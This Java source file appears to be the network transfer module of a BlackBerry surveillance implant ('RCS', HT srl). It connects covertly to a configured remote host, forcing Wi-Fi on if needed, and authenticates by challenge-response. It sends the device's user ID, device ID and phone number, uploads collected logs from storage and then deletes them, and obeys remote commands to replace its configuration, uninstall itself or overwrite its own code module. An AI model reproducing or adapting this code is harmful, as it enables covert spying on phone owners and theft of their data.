//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Transfer.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.transfer;

import java.io.IOException;
import java.util.Random;
import java.util.Vector;

import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.Radio;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.util.Arrays;
import net.rim.device.api.util.DataBuffer;
import blackberry.Conf;
import blackberry.Device;
import blackberry.Status;
import blackberry.action.Apn;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.log.LogCollector;
import blackberry.utils.Check;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Transfer.
 */
public class Transfer {

    private static final int MAX_RECEIVE_LEN = 65536;
    /** The debug instance. */
    //#ifdef DEBUG
    protected static Debug debug = new Debug("Transfer", DebugLevel.INFORMATION);
    //#endif

    /** The Constant instance_. */
    private static Transfer instance = new Transfer();

    /**
     * Gets the single instance of Transfer.
     * 
     * @return single instance of Transfer
     */
    public static Transfer getInstance() {
        return instance;
    }

    private final LogCollector logCollector;

    private final Encryption crypto;
    private String host = "";

    private int port = 0;
    private boolean ssl;

    private boolean wifiForced;
    private boolean gprsAdmitted;
    private boolean wifiAdmitted;
    private Vector apns;

    private boolean connected = false;
    boolean activatedWifi = false;

    public boolean uninstall = false;
    public boolean reload = false;

    private Connection connection = null;

    /** The challenge. */
    byte[] challenge = new byte[16];

    /** The keys. */
    Keys keys;

    /**
     * Instantiates a new transfer.
     */
    protected Transfer() {
        logCollector = LogCollector.getInstance();
        keys = Keys.getInstance();
        crypto = new Encryption();
    }

    /**
     * @param deviceside
     *            == false : connessione via MDS deviceside == true :
     *            connessione diretta ref:
     *            http://na.blackberry.com/eng/developers
     *            /resources/Network_Tranports_tutorial.pdf
     * @return true if connected
     */
    protected boolean connect() {
        if (connected) {
            //#ifdef DEBUG
            debug.error("Already connected");
            //#endif

            //#ifdef DBC
            Check.asserts(connection != null, "connection null");
            //#endif
            return true;
        }

        if (wifiForced) {

            //#ifdef DEBUG_TRACE
            debug.trace("connect: wifiForced");
            //#endif

            int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
            boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
            boolean ret = false;
            if (!active) {
                //#ifdef DEBUG_INFO
                debug.info("Activating Wifi");
                //#endif
                ret = Radio.activateWAFs(waf);
            } else {
                //#ifdef DEBUG_TRACE
                debug.trace("connect: Wifi already active");
                //#endif
            }

            active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
            if (ret && active) {
                activatedWifi = true;
            }

            //#ifdef DEBUG_TRACE
            debug.trace("wifiForced waf: " + waf + " active: " + active);
            //#endif

            //#ifdef DBC
            Check.asserts(wifiAdmitted = true,
                    "connect: wifiForced && !wifiAdmitted");
            //#endif
        }

        if (wifiAdmitted) {
            //#ifdef DEBUG_TRACE
            debug.trace("Try wifi, ssl:" + ssl);
            //#endif

            connection = new WifiConnection(host, port, ssl);

            if (connection.isActive()) {
                //#ifdef DEBUG_TRACE
                debug.trace("wifi connecting...");
                //#endif
                // /wifi = true;

                connected = connection.connect();

                //#ifdef DEBUG
                debug.trace("wifi connected: " + connected);
                if (connected) {
                    debug.info("Connected wifi, ssl:" + ssl);
                }
                //#endif
            } else {
                //#ifdef DEBUG_INFO
                debug.info("wifi not active");
                //#endif
            }
        }

        // fall back
        if (!connected && gprsAdmitted) {
            //#ifdef DEBUG_TRACE
            debug.trace("Try direct tcp, ssl:" + ssl);
            //#endif
            // TODO: limit to the useful and actually working methods, ignore
            // apn

            for (int method = DirectTcpConnection.METHOD_DEVICE; method <= DirectTcpConnection.METHOD_NODEVICE; method++) {
                //#ifdef DEBUG_TRACE
                debug.trace("method: " + method);
                //#endif
                connection = new DirectTcpConnection(host, port, ssl, method);

                connected = connection.connect();

                if (connected) {
                    //#ifdef DEBUG_INFO
                    debug.info("Connected tpc ssl:" + ssl + " method: "
                            + method);
                    //#endif
                    break;
                }
            }
        }

        // fall back
        if (!connected && apns != null) {
            for (int i = 0; i < apns.size(); i++) {
                Apn apn = (Apn) apns.elementAt(i);
                //#ifdef DEBUG_TRACE
                debug.trace("apn: " + apn);
                //#endif

                connection = new DirectTcpConnection(host, port, ssl, apn);

                connected = connection.connect();

                if (connected) {
                    //#ifdef DEBUG_INFO
                    debug.info("Connected tpc ssl:" + ssl + " apn: " + apn);
                    //#endif
                    break;
                }
            }
        }

        if (connection == null) {
            //#ifdef DEBUG
            debug.error("null connection");
            //#endif
            return false;
        }

        //#ifdef DEBUG_INFO
        debug.info("connected: " + connected);

        //#endif
        return connected;

    }

    /**
     * Disconnect.
     * 
     * @param sendbye
     *            the sendbye
     */
    protected final void disconnect(final boolean sendbye) {
        if (connected) {
            connected = false;
            if (sendbye) {
                sendCommand(Proto.BYE);
            }
            connection.disconnect();
            connection = null;
        }
        //#ifdef DEBUG_INFO
        debug.info("connected: " + connected);
        //#endif

        if (activatedWifi) {
            activatedWifi = false;
            int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
            boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
            boolean ret = false;
            if (active) {
                //#ifdef DEBUG_INFO
                debug.info("Deactivating Wifi");
                //#endif
                Radio.deactivateWAFs(waf);
            }

            active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
            //#ifdef DEBUG_TRACE
            debug.trace("deactivating wifiForced waf: " + waf + " active: "
                    + active);
            //#endif
        }
    }

    /**
     * Riceve un intero dalla rete che rappresenta la misura del payload per il
     * comando.
     * 
     * @param command
     *            the command
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void fillPayload(final Command command)
            throws ProtocolException {
        //#ifdef DBC
        Check.ensures(command != null, "command null");
        //#endif

        try {
            final byte[] buflen = connection.receive(4);
            final int len = Utils.byteArrayToInt(buflen, 0);

            //#ifdef DEBUG_TRACE
            debug.trace("fillPayload len: " + len);
            //#endif

            sendCommand(Proto.OK);

            fillPayloadLen(command, len);
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("receiving command: " + e);
            //#endif
            throw new ProtocolException();
        }

    }

    /**
     * Riceve dati per la lunghezza specificata dalla connessione e li usa per
     * riempire il payload del command.
     * 
     * @param command
     *            the command
     * @param len
     *            the len
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void fillPayloadLen(final Command command, final int len)
            throws ProtocolException {
        //#ifdef DBC
        Check.ensures(command != null, "command null");
        //#endif
        //#ifdef DBC
        // Check.ensures(len > 0 && len < MAX_RECEIVE_LEN, "wrong len: " + len);
        //#endif

        try {
            command.payload = connection.receive(len);
            //#ifdef DEBUG_TRACE
            debug.trace("filled with: " + command.payload.length);
            //#endif
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("receiving command: " + e);
            //#endif
            throw new ProtocolException();
        }
    }

    /**
     * Gets the challenge.
     * 
     * @return the challenge
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void getChallenge() throws ProtocolException {

        //#ifdef DEBUG_INFO
        debug.info("getChallenge");

        //#endif

        final Command command = recvCommand();

        if (command == null || command.id != Proto.CHALLENGE) {
            throw new ProtocolException();
        }

        // e' arrivato il challange, leggo il contenuto
        if (command.id == Proto.CHALLENGE) {
            fillPayloadLen(command, 16);

            if (command.size() != 16) {
                //#ifdef DEBUG
                debug.error("getChallenge: expecting 16 bytes");
                //#endif
                throw new ProtocolException();
            }
            // ho 16 byte di challange, li cifro e li salvo
            challenge = crypto.encryptData(command.payload);

        } else {
            throw new ProtocolException();
        }
    }

    /**
     * prende la nuova configurazione e la salva, in modo che alla ripartenza.
     * 
     * @param command
     *            the command
     * @return the new conf
     * @throws CommandException
     *             the command exception
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void getNewConf(final Command command)
            throws CommandException, ProtocolException {

        //#ifdef DEBUG_TRACE
        debug.trace("getNewConf");
        //#endif

        fillPayload(command);
        if (command.size() > 0) {
            // String filename = Encryption.encryptName(Conf.NEW_CONF, 1);
            final AutoFlashFile file = new AutoFlashFile(Conf.NEW_CONF_PATH
                    + Conf.NEW_CONF, true);

            if (file.exists()) {
                file.delete();
            }
            file.create();
            final boolean ret = file.write(command.payload);
            if (!ret) {
                throw new CommandException("write");
            } else {
                sendCommand(Proto.OK);
            }
        } else {
            throw new CommandException("conf");
        }
    }

    /**
     * Gets the response.
     * 
     * @return the response
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void getResponse() throws ProtocolException {
        //#ifdef DEBUG_INFO
        debug.info("getResponse");
        //#endif

        final Command command = recvCommand();
        // boolean exception = false;
        if (command == null || command.id != Proto.RESPONSE) {
            throw new ProtocolException();
        }

        // e' arrivato il response, leggo il contenuto
        if (command.id == Proto.RESPONSE) {
            fillPayloadLen(command, 16);
            if (command.size() != 16) {
                throw new ProtocolException();
            }
            // ho 16 byte di response, lo confronto con il challange crittato
            final byte[] cryptoChallenge = crypto.encryptData(challenge);
            if (!Arrays.equals(cryptoChallenge, command.payload)) {
                throw new ProtocolException();
            } else {
                //#ifdef DEBUG_INFO
                debug.info("Response OK");
                //#endif
                sendCommand(Proto.OK);
            }

        } else {
            throw new ProtocolException();
        }

    }

    /**
     * Gets the upgrade.
     * 
     * @param command
     *            the command
     * @return the upgrade
     * @throws CommandException
     *             the command exception
     * @throws ProtocolException
     */
    protected final void getUpgrade(final Command command)
            throws CommandException, ProtocolException {

        //#ifdef DEBUG_TRACE
        debug.trace("getUpgrade");
        //#endif

        sendCommand(Proto.OK);

        //#ifdef DEBUG_TRACE
        debug.trace("fill");
        //#endif
        fillPayload(command);
        if (command.size() > 0) {
            if (upgrade(command.payload)) {
                sendCommand(Proto.OK);

            } else {
                throw new CommandException("Upgrade Core");
            }

        } else {
            throw new CommandException("Empty core");
        }

    }

    private boolean upgrade(byte[] codBuff) {
        // Delete it self.
        int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
        if (handle != 0) {
            int success = CodeModuleManager.deleteModuleEx(handle, true);
            //#ifdef DEBUG_INFO
            debug.info("deleted: " + success);
            //#endif
        } else {
            return false;
        }
        // Download new cod files(included sibling files).

        if (isZip(codBuff)) {
            //#ifdef DEBUG_WARN
            debug.warn("zip not supported");
            //#endif
            return false;
        } else {
            int newHandle = 0;
            // API REFERENCE:
            // You need to write the data in two separate chunks.
            // The first data chunk must be less thank 64KB in size.
            int MAXAPPEND = 61440; // 1024*60;

            if (codBuff.length > MAXAPPEND) {
                newHandle = CodeModuleManager.createNewModule(codBuff.length,
                        codBuff, MAXAPPEND);

                boolean appendSucc = CodeModuleManager.writeNewModule(
                        newHandle, MAXAPPEND, codBuff, MAXAPPEND,
                        codBuff.length - MAXAPPEND);

                codBuff = null;
            } else {
                newHandle = CodeModuleManager.createNewModule(codBuff.length,
                        codBuff, codBuff.length);

            }
            // install the module
            if (newHandle != 0) {
                int savecode = CodeModuleManager.saveNewModule(newHandle, true);
                if (savecode != CodeModuleManager.CMM_OK_MODULE_OVERWRITTEN) {
                    //#ifdef DEBUG_ERROR
                    debug.error("Module not overwritten");
                    //#endif
                    return false;
                }
            }
            //#ifdef DEBUG_INFO
            debug.info("Module installed");
            //#endif

            // restart the blackberry if required
            if (CodeModuleManager.isResetRequired()) {
                //#ifdef DEBUG
                CodeModuleManager.promptForResetIfRequired();
                //#endif
                //#ifdef DEBUG_WARN
                debug.warn("Reset required");
                //#endif
            }
        }
        return true;
    }

    private boolean isZip(byte[] core) {

        if (core.length >= 4) {
            // zip files start with PK followed by 0x03 and 0x04
            if (core[0] == 0x50 && core[1] == 0x4B && core[2] == 0x03
                    && core[3] == 0x04) {
                return true;
            }
        }
        return false;

    }

    /**
     * Gets the upload.
     * 
     * @param command
     *            the command
     * @return the upload
     * @throws CommandException
     *             the command exception
     */
    protected final void getUpload(final Command command)
            throws CommandException {
        throw new CommandException("Not Implemented");
    }

    /**
     * Inits the.
     * 
     * @param host_
     *            the host_
     * @param port_
     *            the port_
     * @param ssl_
     *            the ssl_
     * @param wifiPreferred_
     *            the wifi preferred_
     * @param gprs
     * @param apns
     */
    public final void initApn(final String host_, final int port_,
            final boolean ssl_, final boolean wifiForced, final boolean wifi,
            final boolean gprs, final Vector apns) {

        reload = false;
        uninstall = false;

        host = host_;
        port = port_;
        ssl = ssl_;
        this.wifiForced = wifiForced;
        wifiAdmitted = wifi;
        gprsAdmitted = gprs;
        this.apns = apns;
        crypto.makeKey(Keys.getInstance().getChallengeKey());
    }

    public final void init(final String host_, final int port_,
            final boolean ssl_, final boolean wifiForced, final boolean wifi,
            final boolean gprs) {

        reload = false;
        uninstall = false;

        host = host_;
        port = port_;
        ssl = ssl_;
        this.wifiForced = wifiForced;
        wifiAdmitted = wifi;
        gprsAdmitted = gprs;

        apns = null;

        crypto.makeKey(Keys.getInstance().getChallengeKey());
    }

    /**
     * Parses the command.
     * 
     * @param command
     *            the command
     * @return true, if successful
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final boolean parseCommand(final Command command)
            throws ProtocolException {
        //#ifdef DBC
        Check.asserts(command != null, "null command");
        //#endif

        try {

            switch (command.id) {
            case Proto.SYNC:
                //#ifdef DEBUG_INFO
                debug.info("SYNC");
                //#endif
                syncLogs(command);
                break;

            case Proto.NEW_CONF:
                //#ifdef DEBUG_INFO
                debug.info("NEW_CONF");
                //#endif
                getNewConf(command);
                reload = true;
                break;

            case Proto.UNINSTALL:
                //#ifdef DEBUG_INFO
                debug.info("UNINSTALL");
                //#endif
                uninstall = true;
                sendCommand(Proto.OK);
                return false;

            case Proto.DOWNLOAD:
                //#ifdef DEBUG_INFO
                debug.info("DOWNLOAD");
                //#endif
                sendDownload(command);
                break;

            case Proto.UPLOAD:
                //#ifdef DEBUG_INFO
                debug.info("UPLOAD");
                //#endif
                getUpload(command);
                break;

            case Proto.UPGRADE:
                //#ifdef DEBUG_INFO
                debug.info("UPGRADE");
                //#endif
                getUpgrade(command);
                break;

            case Proto.BYE:
                //#ifdef DEBUG_INFO
                debug.info("BYE");
                //#endif
                return false;

            default:
                break;
            }
        } catch (final CommandException ex) {
            //#ifdef DEBUG
            debug.warn("parseCommand exception:" + ex);
            //#endif
            sendCommand(Proto.NO);
        }

        return true;
    }

    /**
     * Recv command.
     * 
     * @return the command
     */
    protected final Command recvCommand() {
        //#ifdef DEBUG_TRACE
        debug.trace("recvCommand");
        //#endif

        Command command = null;
        byte[] commandId;
        try {
            //#ifdef DBC
            Check.asserts(connection.isActive(),
                    "recvCommand connection not active");
            //#endif
            if (!connection.connected) {
                //#ifdef DEBUG
                debug.error("receiving command: disconnected");
                //#endif
                return null;
            }

            commandId = connection.receive(4);
            final int id = Utils.byteArrayToInt(commandId, 0);
            if (id != 0) {
                command = new Command(id, null);
            }
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("receiving command: " + e);
            //#endif
            return null;
        }

        //#ifdef DEBUG_TRACE
        debug.trace("received command: " + command);

        //#endif
        return command;
    }

    /**
     * Send challenge.
     * 
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void sendChallenge() throws ProtocolException {

        //#ifdef DEBUG_INFO
        debug.info("sendChallenge");

        //#endif

        // TODO: keep a log seed
        final Random random = new Random();

        for (int i = 0; i < 16; i++) {
            challenge[i] = (byte) random.nextInt();
        }

        if (!sendCommand(Proto.CHALLENGE, challenge)) {
            throw new ProtocolException();
        }
    }

    /**
     * Send command.
     * 
     * @param command
     *            the command
     * @return true, if successful
     */
    protected final boolean sendCommand(final Command command) {

        if (Status.getInstance().crisisSync() && command.id != Proto.BYE) {
            //#ifdef DEBUG
            debug.warn("SyncAction - stop sync, we are in crisis");
            //#endif

            sendCommand(Proto.BYE);
            
            return false;
        }
        
        //#ifdef DBC
        Check.requires(command != null, "null command");
        //#endif
        //#ifdef DEBUG_TRACE
        debug.trace("sending command: " + command);
        //#endif

        final byte[] data = new byte[command.size() + 4];
        final DataBuffer databuffer = new DataBuffer(data, 0, data.length,
                false);

        databuffer.writeInt(command.id);
        if (command.payload != null) {

            databuffer.write(command.payload);
        } else {
            //#ifdef DEBUG_TRACE
            debug.trace("payload null");
            //#endif
        }

        //#ifdef DBC
        Check.ensures(command.size() + 4 == data.length, "wrong length");
        //#endif

        try {
            return connection.send(data);
        } catch (final IOException e) {
            return false;
        }
    }

    /**
     * Send command.
     * 
     * @param command
     *            the command
     * @return true, if successful
     */
    protected final boolean sendCommand(final int command) {
        return sendCommand(new Command(command, null));
    }

    /**
     * Send command.
     * 
     * @param command
     *            the command
     * @param payload
     *            the payload
     * @return true, if successful
     */
    protected final boolean sendCommand(final int command, final byte[] payload) {
        return sendCommand(new Command(command, payload));
    }

    /**
     * Send crypto command.
     * 
     * @param commandId
     *            the command id
     * @param plain
     *            the plain
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void sendCryptoCommand(final int commandId,
            final byte[] plain) throws ProtocolException {

        sendManagedCommand(commandId, plain, true);

    }

    /**
     * Send download.
     * 
     * @param command
     *            the command
     * @throws CommandException
     *             the command exception
     */
    protected final void sendDownload(final Command command)
            throws CommandException {
        throw new CommandException("Not Implemented");
    }

    /**
     * Send ids.
     * 
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void sendIds() throws ProtocolException {

        final Device device = Device.getInstance();
        device.refreshData();

        sendCryptoCommand(Proto.VERSION, Device.getVersion()); // 4
        sendCryptoCommand(Proto.SUBTYPE, Device.getSubtype()); // 2
        sendCryptoCommand(Proto.ID, keys.getBuildId()); // 16
        sendCryptoCommand(Proto.INSTANCE, keys.getInstanceId()); // 20

        sendCryptoCommand(Proto.USERID, device.getWUserId());
        sendCryptoCommand(Proto.DEVICEID, device.getWDeviceId());
        sendCryptoCommand(Proto.SOURCEID, device.getWPhoneNumber());

    }

    private void sendLogs(final String basePath) throws ProtocolException {
        //#ifdef DEBUG_INFO
        debug.info("sending logs from: " + basePath);
        //#endif

        final Vector dirs = logCollector.scanForDirLogs(basePath);
        final int dsize = dirs.size();
        for (int i = 0; i < dsize; ++i) {
            final String dir = (String) dirs.elementAt(i);
            final Vector logs = logCollector.scanForLogs(basePath, dir);
            final int lsize = logs.size();
            for (int j = 0; j < lsize; ++j) {
                final String logName = (String) logs.elementAt(j);
                final String fullLogName = basePath + dir + logName;
                final AutoFlashFile file = new AutoFlashFile(fullLogName, false);
                if (!file.exists()) {
                    //#ifdef DEBUG_ERROR
                    debug.error("File doesn't exist: " + fullLogName);
                    //#endif
                    continue;
                }
                final byte[] content = file.read();
                //#ifdef DEBUG
                debug.info("Sending file: " + LogCollector.decryptName(logName)
                        + " = " + fullLogName);
                //#endif

                final boolean ret = sendManagedCommand(Proto.LOG, content,
                        false);

                if (!ret) {
                    //#ifdef DEBUG_ERROR
                    debug.error("cannot send file: " + fullLogName);
                    //#endif
                }
                logCollector.remove(fullLogName);
            }
            if (!Path.removeDirectory(basePath + dir)) {
                //#ifdef DEBUG_WARN
                debug.warn("Not empty directory");
                //#endif
            }
        }
    }

    /**
     * Send managed command.
     * 
     * @param commandId
     *            the command id
     * @param plain
     *            the plain
     * @param cypher
     *            the cypher
     * @return true, if successful
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final boolean sendManagedCommand(final int commandId,
            final byte[] plain, final boolean cypher) throws ProtocolException {

        byte[] toSend;

        if (cypher) {
            //#ifdef DEBUG_TRACE
            debug.trace("Sending Crypto Command: " + commandId);
            //#endif
            toSend = crypto.encryptData(plain);
        } else {
            //#ifdef DEBUG_TRACE
            debug.trace("Sending Managed Command: " + commandId);
            //#endif
            toSend = plain;
        }

        sendCommand(commandId, Utils.intToByteArray(plain.length));
        final boolean ok = waitForOKorNO();
        if (!ok) {
            //#ifdef DEBUG
            debug.error("received a NO, maybe a log key error");
            //#endif
            return false;
        }

        boolean sent = false;
        try {
            //#ifdef DEBUG_TRACE
            debug.trace("sending content");
            //#endif
            sent = connection.send(toSend);
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e.toString());
            //#endif
        }

        if (!sent) {
            throw new ProtocolException();
        }

        return waitForOKorNO();

    }

    /**
     * Send response.
     * 
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void sendResponse() throws ProtocolException {
        //#ifdef DBC
        Check.requires(challenge != null, "null crypto challange");
        //#endif

        //#ifdef DEBUG_INFO
        debug.info("sendResponse");

        //#endif

        // challange contiene il challange cifrato, pronto per spedizione
        if (!sendCommand(Proto.RESPONSE, challenge)) {
            throw new ProtocolException();
        }

        waitForOK();
    }

    /**
     * Send.
     * 
     * @return true, if successful
     */
    public final synchronized boolean startSession() {
        //#ifdef DEBUG_TRACE
        debug.trace("startSession");
        //#endif
        try {
            if (!connect()) {
                //#ifdef DEBUG
                debug.error("not connected");
                //#endif
                return false;
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("not connected: " + ex);
            //#endif
            return false;
        }

        boolean gotbye = false;
        try {
            // challenge response
            //#ifdef DEBUG_TRACE
            debug.trace("ChallengeResponse ->");
            //#endif
            sendChallenge();
            getResponse();

            //#ifdef DEBUG_TRACE
            debug.trace("ChallengeResponse <-");

            //#endif
            getChallenge();
            sendResponse();

            // identificazione
            //#ifdef DEBUG_TRACE
            debug.trace("Ids");
            //#endif
            sendIds();

            // ricezione configurazione o comandi
            for (;;) {
                final Command command = recvCommand();
                //#ifdef DEBUG_INFO
                debug.info("Received command:" + command);
                //#endif

                if (command == null || !parseCommand(command)) {
                    //#ifdef DEBUG_INFO
                    debug.info("finished commands");
                    //#endif
                    break;
                }
            }
        } catch (final ProtocolException ex) {
            //#ifdef DEBUG
            debug.error("protocol exception");
            //#endif
            gotbye = ex.bye;
            return false;
        } finally {
            //#ifdef DEBUG_INFO
            debug.info("disconnect");
            //#endif
            disconnect(!gotbye);
        }

        //#ifdef DEBUG_INFO
        debug.info("done");

        //#endif
        return true;
    }

    /**
     * Sync logs.
     * 
     * @param command
     *            the command
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final synchronized void syncLogs(final Command command)
            throws ProtocolException {

        //#ifdef DEBUG_INFO
        debug.info("syncLogs connected: " + connected);
        //#endif

        sendLogs(Path.SD());
        sendLogs(Path.USER());

        //#ifdef DEBUG_TRACE
        debug.trace("syncLogs: all logs sent");
        //#endif

        sendCommand(Proto.LOG_END);
        waitForOK();
    }

    private void waitForOK() throws ProtocolException {
        final Command ok = recvCommand();
        if (ok == null || ok.id != Proto.OK) {
            throw new ProtocolException();
        }
    }

    private boolean waitForOKorNO() throws ProtocolException {
        final Command ok = recvCommand();
        if (ok == null) {
            throw new ProtocolException();
        }

        switch (ok.id) {

        case Proto.OK:
            return true;

        case Proto.NO:
            return false;

        case Proto.BYE:
            throw new ProtocolException(true);

        default:
            throw new ProtocolException();
        }

    }
}
